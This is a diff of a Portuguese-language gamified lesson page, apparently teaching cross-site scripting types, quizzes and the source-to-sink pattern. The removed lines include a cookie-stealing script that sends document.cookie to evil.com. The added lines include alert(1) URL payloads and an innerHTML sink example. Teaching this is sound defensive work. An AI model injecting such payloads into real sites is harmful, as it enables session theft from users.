@@ -9,7 +9,7 @@
     <link rel="dns-prefetch" href="https://fonts.googleapis.com">
     <link rel="dns-prefetch" href="https://fonts.gstatic.com">
     <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com">
-    <title>CyberDuo - Cross-Site Scripting 6.7</title>
+    <title>CyberDuo - Cross-Site Scripting (XSS)</title>
     <link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
     <link rel="stylesheet" href="../assets/tailwind.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -131,47 +131,99 @@
         const steps = [
             {
                         "type": "teach",
-                        "icon": "fa-code",
-                        "title": "O que é XSS?",
-                        "content": "<b>Cross-Site Scripting (XSS)</b> injeta código JavaScript malicioso em páginas web. Quando outro usuário acessa a página, o script executa no browser da <b>vítima</b>.",
-                        "highlight": "XSS = injetar JS que roda no browser da vítima"
-            },
-            {
-                        "type": "teach",
-                        "icon": "fa-layer-group",
-                        "title": "Tipos de XSS",
-                        "content": "<b>Reflected</b>: payload na URL, executa quando a vítima clica. <b>Stored</b>: payload salvo no banco, executa para todos que acessam. <b>DOM-based</b>: manipula o DOM no client-side.",
-                        "highlight": "Stored XSS é o mais perigoso (afeta todos)"
+                        "icon": "fa-reply",
+                        "title": "XSS Refletido",
+                        "content": "No <b>XSS Refletido</b>, o payload malicioso é enviado na própria URL ou formulário, o servidor processa e 'reflete' (devolve) o script direto na tela da vítima, executando no navegador dela imediatamente."
             },
             {
                         "type": "example",
-                        "icon": "fa-terminal",
-                        "title": "Roubo de Cookie via XSS",
-                        "scenario": "O atacante injeta em um comentário: o script envia o cookie de sessão de todo usuário que ler o comentário para o servidor do atacante.",
-                        "code": "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>",
-                        "takeaway": "XSS Stored permite roubar sessões de todos os visitantes da página."
+                        "icon": "fa-link",
+                        "title": "Link Malicioso",
+                        "scenario": "O hacker envia um link pro e-mail da vítima: `site.com/busca?q=<script>alert(1)</script>`. Quando ela clica, o site carrega a busca e executa o script.",
+                        "takeaway": "Requer engenharia social para a vítima clicar no link."
             },
             {
                         "type": "quiz",
-                        "task": "Qual tipo de XSS salva o payload no banco de dados e afeta todos os visitantes?",
+                        "task": "Por que o XSS Refletido recebe esse nome?",
                         "options": [
-                                    "Stored XSS",
-                                    "Reflected XSS",
-                                    "DOM-based XSS"
+                                    "Porque o servidor reflete o payload recebido diretamente de volta na resposta HTTP.",
+                                    "Porque o ataque reflete nos logs do firewall.",
+                                    "Porque ele armazena o vírus e reflete anos depois."
                         ],
-                        "correctText": "Stored XSS",
-                        "explanation": "Stored XSS é persistente — o payload fica salvo e executa para cada visitante."
+                        "correctText": "Porque o servidor reflete o payload recebido diretamente de volta na resposta HTTP.",
+                        "explanation": "O ataque é em tempo real e não fica salvo no servidor."
+            },
+            {
+                        "type": "teach",
+                        "icon": "fa-box-archive",
+                        "title": "XSS Armazenado (Stored)",
+                        "content": "No <b>XSS Armazenado</b>, o script malicioso é injetado e salvo permanentemente no banco de dados do servidor (ex: em um comentário de blog). É muito mais perigoso."
+            },
+            {
+                        "type": "example",
+                        "icon": "fa-users",
+                        "title": "Ataque em Massa",
+                        "scenario": "O hacker comenta num fórum: `<script>roubar_cookie()</script>`. Todo mundo que entrar na página do fórum terá seu cookie roubado silenciosamente.",
+                        "takeaway": "Não precisa enviar links. A própria aplicação espalha o ataque."
             },
             {
                         "type": "fill",
-                        "sentence": "A defesa principal contra XSS é aplicar ___ em toda saída de dados para o HTML.",
+                        "sentence": "O XSS mais letal, pois infecta qualquer usuário legítimo que visite a página contaminada sem precisar clicar em links falsos, é o XSS ___.",
                         "options": [
-                                    "encoding/escaping",
-                                    "compressão",
-                                    "criptografia"
+                                    "Armazenado",
+                                    "Refletido",
+                                    "DOM"
                         ],
-                        "correctText": "encoding/escaping",
-                        "explanation": "Output encoding converte caracteres especiais (<, >, &) em entidades HTML inofensivas."
+                        "correctText": "Armazenado",
+                        "explanation": "O payload 'mora' no banco de dados da aplicação web."
+            },
+            {
+                        "type": "teach",
+                        "icon": "fa-laptop-code",
+                        "title": "DOM-Based XSS",
+                        "content": "No <b>DOM-based XSS</b>, o ataque acontece apenas no navegador do cliente (no fluxo do JavaScript local). O servidor web muitas vezes nem enxerga o payload malicioso."
+            },
+            {
+                        "type": "example",
+                        "icon": "fa-code",
+                        "title": "Manipulação Local",
+                        "scenario": "A URL possui `site.com/#bemvindo=<script>alert(1)</script>`. O JavaScript do site pega esse texto depois da hashtag e coloca na tela sem validação. O servidor nem lê a hashtag.",
+                        "takeaway": "A validação deve ocorrer no próprio JavaScript do frontend."
+            },
+            {
+                        "type": "quiz",
+                        "task": "Por que o WAF (Firewall de Servidor) geralmente NÃO consegue bloquear um ataque DOM-based XSS?",
+                        "options": [
+                                    "Porque o payload malicioso não é enviado ao servidor, sendo processado apenas localmente pelo navegador.",
+                                    "Porque o DOM XSS usa criptografia de ponta-a-ponta nativa.",
+                                    "Porque o firewall só filtra tráfego de banco de dados."
+                        ],
+                        "correctText": "Porque o payload malicioso não é enviado ao servidor, sendo processado apenas localmente pelo navegador.",
+                        "explanation": "Tudo depois do caractere '#' (fragmento) não é enviado em requisições HTTP ao servidor."
+            },
+            {
+                        "type": "teach",
+                        "icon": "fa-bug",
+                        "title": "Sources e Sinks",
+                        "content": "O ataque de DOM XSS precisa de duas coisas: uma <b>Source</b> (dado perigoso entrando, como `location.hash`) repassada para um <b>Sink</b> perigoso (onde o código executa, como `innerHTML`)."
+            },
+            {
+                        "type": "example",
+                        "icon": "fa-bomb",
+                        "title": "O Funil Fatal",
+                        "scenario": "Source: `var input = window.location.hash;`. Sink: `document.getElementById('msg').innerHTML = input;`. Quando o dado sujo toca no Sink, a injeção acontece.",
+                        "takeaway": "Limpar o dado ANTES de chegar no Sink previne o ataque."
+            },
+            {
+                        "type": "fill",
+                        "sentence": "Qual função JavaScript nativa e altamente perigosa interpreta strings de texto bruto diretamente como código HTML, sendo o principal Sink explorado em DOM XSS? (document._____)",
+                        "options": [
+                                    "innerHTML",
+                                    "console.log",
+                                    "innerText"
+                        ],
+                        "correctText": "innerHTML",
+                        "explanation": "O `innerHTML` interpreta tags em vez de exibi-las como texto."
             }
 ];
 
@@ -461,7 +513,7 @@
             document.getElementById('gameArea').innerHTML = `
                 <div class="game-card teach-card" style="align-items: center; text-align: center; border-color: var(--cyber-blue)">
                     <i class="fas fa-medal text-6xl text-yellow-400 mb-4 mt-4"></i>
-                    <h2 class="title-main mb-2">XSS DOMINADO!</h2>
+                    <h2 class="title-main mb-2">Você concluiu esta lição e dominou os conceitos apresentados.</h2>
                     <p class="text-body mb-6">Você completou esta lição com sucesso!</p>
                     <div style="display: flex; flex-direction: column; gap: 1rem; width: 100%; align-items: center; margin-top: 1rem;">
                         ${nextBtnHtml}
